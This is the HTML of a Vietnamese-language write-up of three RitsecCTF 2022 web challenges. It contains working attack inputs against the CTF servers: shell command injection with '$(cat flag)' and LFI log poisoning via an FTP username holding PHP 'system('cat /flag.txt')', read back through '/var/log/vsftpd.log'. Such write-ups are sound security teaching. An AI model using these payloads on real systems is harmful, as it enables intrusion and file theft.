@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en" data-mode="dark">
+  <head prefix="og: http://ogp.me/ns#">
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hugo 0.98.0">
+<meta name="theme" content="Color Your World -- gitlab.com/rmaguiar/hugo-theme-color-your-world">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<title>RitsecCTF 2022 | D@rkmod3</title>
+
+
+
+
+
+
+<meta name="robots" content="index follow">
+
+
+
+
+  
+    <link rel="canonical" href="/posts/ritsecctf_2022/">
+  
+
+
+
+
+
+
+
+
+<meta property="og:site_name" content="D@rkmod3">
+<meta property="og:title" content="RitsecCTF 2022">
+
+  <meta property="og:url" content="/posts/ritsecctf_2022/">
+
+
+
+
+
+
+
+  
+
+
+  <meta property="og:type" content="article">
+  
+  
+    <meta property="article:published_time" content="2022-04-04">
+    <meta property="article:modified_time" content="2022-04-04">
+    <meta property="og:updated_time" content="2022-04-04">
+  
+
+  
+  
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="theme-color" content="#222">
+
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebSite",
+        "@id": ""
+      },
+      "headline": "RitsecCTF 2022",
+      "description": "",
+      
+      "url": "\/posts\/ritsecctf_2022\/",
+      "inLanguage": "en",
+      "datePublished": "2022-04-04",
+      "dateModified": "2022-04-04",
+      "wordCount" : "636",
+      "publisher": {
+        "@type": "Person",
+        "name": ""
+      },
+      "author": {
+        "@type": "Person",
+        "name": "",
+        
+        
+      }
+    }
+  </script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.min.860f44e9e1bd35f9d67581a67fe8cdb3a88bf684226678fdc2227107af13e885.css" integrity="sha256-hg9E6eG9NfnWdYGmf&#43;jNs6iL9oQiZnj9wiJxB68T6IU=" crossorigin="anonymous">
+
+
+
+<noscript>
+
+  
+  
+
+  
+    <meta name="theme-color" content="#1dbc91" media="(prefers-color-scheme: dark)">
+    <meta name="theme-color" content="#1f676b" media="(prefers-color-scheme: light)">
+  
+
+  
+  <link rel="stylesheet" href="/css/noscript.min.3f3b95436b19eaeb9223fb12c0b86737d53ee0a47fdba271a886c244bc03975c.css" integrity="sha256-PzuVQ2sZ6uuSI/sSwLhnN9U&#43;4KR/26JxqIbCRLwDl1w=" crossorigin="anonymous">
+
+</noscript>
+
+
+
+<link rel="preload" href="/fonts/open-sans-v17-latin-700.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/open-sans-v17-latin-italic.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/open-sans-v17-latin-regular.woff2" as="font" crossorigin="anonymous">
+<link rel="preload" href="/fonts/oswald-v29-latin-700.woff2" as="font" crossorigin="anonymous">
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<script src="/js/main.f1da21dfea83dc0c36cea0b202c14a97e00aedab567e32702eb120f5ab8d974b.js" integrity="sha256-8doh3&#43;qD3Aw2zqCyAsFKl&#43;AK7atWfjJwLrEg9auNl0s=" crossorigin="anonymous"></script>
+
+  </head>
+
+  <body>
+
+    <header>
+      
+
+  <a href="/">D@rkmod3</a>
+
+
+
+
+
+    </header>
+
+    <div class="filler">
+      
+
+  <main>
+    <article>
+      <header>
+        
+        <h1>RitsecCTF 2022</h1>
+
+        
+          <p>
+            
+              Published on <time datetime="2022-04-04">2022-04-04</time>
+            
+          </p>
+        
+        
+        
+        
+      </header>
+    
+      
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <h2 id="really-cool-encryption"><a class="anchor" href="#really-cool-encryption" title='Anchor for: Really Cool Encryption.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> Really Cool Encryption</h2> 
+
+<p>Bài này cho phép chúng ta nhập vào 1 input bất kì và in ra base64 encode của input đó.</p>
+
+
+
+
+
+
+
+
+
+  <h4 id="fuzzing-ssti"><a class="anchor" href="#fuzzing-ssti" title='Anchor for: Fuzzing SSTI.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> Fuzzing SSTI</h4> 
+
+<pre aria-label="Box containing code sample." tabindex=0><code>{{7*7}}, {% if ... %}, ...
+</code></pre><p>và nhận thấy rằng chall không có vuln ssti.</p>
+<p>Fuzzing 1 lúc, mình nhận ra nếu input chứa dấu “(” hoặc “)” thì sẽ không in ra gì cả.</p>
+<p>Mình quyết định bruteforce các kí tự <code>printable</code> để xem hành vi xử lí của input.</p>
+<p>Kí tự <code>.</code> và <code>~</code> trả về 1 output base64 có độ dài khác thường, cụ thể dấu <code>.</code> sẽ trả về</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>Dockerfile docker-compose.yml ezpwn.py flag templates
+</code></pre><p>và dấu <code>~</code> sẽ trả về</p>
+<p><code>/home/bruh.</code></p>
+<p>Dựa vào hành vi xử lí này, mình đoán đoạn code ở server sẽ thực hiện câu lệnh echo trong system.</p>
+<p>Lấy flag thôi nào, <code>$(cat flag)</code>. Khoan, dừng khoảng chừng là 2s, lúc mình cat flag thì output trả lại “haha, you’re not done yet”.</p>
+
+
+
+
+
+
+
+
+
+  <h4 id="lấy-flag-từ-docker-image"><a class="anchor" href="#lấy-flag-từ-docker-image" title='Anchor for: Lấy flag từ docker image.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> Lấy flag từ docker image</h4> 
+
+<p>Okay, Kéo image về máy bằng câu lệnh</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>docker pull youngbaofeng/google-image-search-pretext:latest
+</code></pre><p>Lưu image dưới dạng compress file</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>docker save youngbaofeng/google-image-search-pretext:latest -o Ritsec_rce.tar
+</code></pre><p>Giải nén</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>tar -xvf Ritsec_rce.tar
+</code></pre><p>Grep:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>grep -r &#34;RS{.*}&#34;
+</code></pre><p>Flag:</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/RitsecCTF2022/flagRCE.png"
+      
+    />
+
+  
+
+</p>
+<section class="scroll" tabindex="0"> <table>
+<thead>
+<tr>
+<th>RS{CHANDI_HEADREST}</th>
+</tr>
+</thead>
+</table> </section>
+
+
+
+
+
+
+
+
+
+  <h2 id="down-the-data-streams"><a class="anchor" href="#down-the-data-streams" title='Anchor for: Down the Data Streams.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> Down the Data Streams</h2> 
+
+<p>Bài này bắt đầu bằng 1 đường dẫn /{filename}.txt.</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/RitsecCTF2022/Step1.png"
+      
+    />
+
+  
+
+</p>
+<p>Magic bytes của loại file png 8950 4e47 quen thuộc trong dãy 89504e470d0a1a0a0000000d49484452</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/RitsecCTF2022/Step2.png"
+      
+    />
+
+  
+
+</p>
+<p>Mình đoán dụng ý người ra đề muốn chúng ta khôi phục lại bức ảnh gốc, đây là 1 chall kiểu mix giữa web-forensic, mình thấy khá thú vị.</p>
+<p>Nhìn vào nội dung file txt, ta thấy quy luật sau:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>[offset, bytestring] nextpath
+</code></pre><p>Truy cập vào {nextpath}.txt ta được nội dung của chunk tiếp theo. Biết quy luật rồi thì ta giải quyết thôi :v</p>
+<p>(P/s: Để tối ưu hoá code thì mình sử dụng session thay vì tạo mới request qua mỗi vòng lặp, như vậy tốc độ request sẽ nhanh hơn)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> session
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span>re 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://ctf.ritsec.club/data-streams/&#39;</span>
+</span></span><span style="display:flex;"><span>stream <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;6610e477ddefc14511cc4f261c3c608d&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_data <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">100000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">splitValue</span>(txt):
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\[(\d+)&#34;</span>, txt)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    bytestring <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;&#39;(.*?)&#39;&#34;</span>, txt)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    nextstream <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>findall(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;\]\s(.*)&#34;</span>, txt)[<span style="color:#ae81ff">0</span>] 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> int(offset,<span style="color:#ae81ff">10</span>),bytestring,nextstream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">global</span> stream, _data
+</span></span><span style="display:flex;"><span>            r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> stream <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>            print(url <span style="color:#f92672">+</span> stream <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.txt&#39;</span>)
+</span></span><span style="display:flex;"><span>            offset,bytestring,nextstream <span style="color:#f92672">=</span> splitValue(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>            _data[offset] <span style="color:#f92672">=</span> bytestring
+</span></span><span style="display:flex;"><span>            stream <span style="color:#f92672">=</span> nextstream
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            _data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(_data)
+</span></span><span style="display:flex;"><span>            f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;result.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>write(_data)
+</span></span><span style="display:flex;"><span>            f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>            print(e)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>solve()
+</span></span></code></pre></div><p>Bước cuối cùng ta mở file result.txt coppy bytestream và paste vào HXD</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/RitsecCTF2022/Step3.png"
+      
+    />
+
+  
+
+</p>
+<p>Bài này mình tốn tận 45 phút để get hơn 14000 request :))</p>
+<p>Flag:</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+
+    <img
+      class="borderless"
+      loading="lazy"
+      src="/posts/img/RitsecCTF2022/flagdatastream.png"
+      
+    />
+
+  
+
+</p>
+<section class="scroll" tabindex="0"> <table>
+<thead>
+<tr>
+<th>RS{81ngu5_w3b_53rvic3s}</th>
+</tr>
+</thead>
+</table> </section>
+
+
+
+
+
+
+
+
+
+  <h2 id="bingus-access"><a class="anchor" href="#bingus-access" title='Anchor for: Bingus Access.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#hashtag"/></svg></a> Bingus Access</h2> 
+
+<p>Bài này khi ta nhấn vào hình con mèo nó sẽ redirect đến trang info.html</p>
+<p>Trong file này có 1 hint rất quan trọng</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>You wont stop yoinky sploinky, heres a hint for you: you know i made a url get parameter &#34;file&#34;, but it is sort of &#34;restricted&#34;, but I also have ftp and I log stuff, so no yoinky sploinky there.
+</code></pre><p>Như vậy param <code>?file={filename}</code> có chức năng cho phép chúng ta chạm đến các file khác trong hệ thống.</p>
+<p>Thử 1 số trick với LFI mình đã không thành công. Bị stuck khoảng chừng 1 tiếng thì mình nhận ra rằng đoạn description của bài có nhắc đến apache logs. Kết hợp với hint FTP mình gởi query như sau:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>?file=/var/log/vsftpd.log
+</code></pre><p>Trong file này trả về toàn bộ log đăng nhập của user lúc user đăng nhập vào thông qua protocol FTP (Thông tin bao gồm tên, IP, Mac address).</p>
+<p>Đây là lúc magic xảy ra :)), mình login thử với credential như sau:</p>
+<pre aria-label="Box containing code sample." tabindex=0><code>host = ctf.ritsec.club:2121
+username = &lt;?php echo &#34;hello&#34;; ?&gt;
+password = d4rkmod3ontheland
+</code></pre><p>Query đến <code>?file=/var/log/vsftpd.log</code> và ta có được chữ <code>hello</code> thay vì <code>&lt;?php echo &quot;hello&quot;; ?&gt;</code></p>
+<p>Kết luận, <code>LFI log poisioning.</code></p>
+<p>Login với username là <code>&lt;?php system('cat /flag.txt'); ?&gt;</code>, mình có được flag:</p>
+<section class="scroll" tabindex="0"> <table>
+<thead>
+<tr>
+<th>RS{B1NGU5_FL4G}</th>
+</tr>
+</thead>
+</table> </section>
+
+
+
+    </article>
+  </main>
+
+
+    </div>
+    
+    <footer>
+      
+
+
+  
+
+    
+
+    
+      
+      
+    
+    
+    <p>Welcome to my lord.</p>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="req-js">
+  <button class="outline-dashed" title="Change to light/dark mode."><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><use xlink:href="/img/bundle.min.fc89b321aa39dfb355170fc007ce5b94.svg#adjust"/></svg></button><input class="outline-dashed" type="color" list="presets" value="#1dbc91" title="Change accent color." aria-label="Change accent color."><datalist id="presets"><option value="#1f676b"><option value="#1dbc91"><option value="#f3a530"><option value="#902b37"><option value="#754e85"><option value="#7fc121"><option value="#a8314a"><option value="#ff7433"><option value="#3e6728"><option value="#c063bd"></datalist>
+</section>
+
+
+
+  <noscript>
+    <p class="noscript">Unable to execute JavaScript. Some features were disabled.</p>
+  </noscript>
+
+
+
+    </footer>
+    
+    
+    
+
+    
+    
+
+  </body>
+</html>
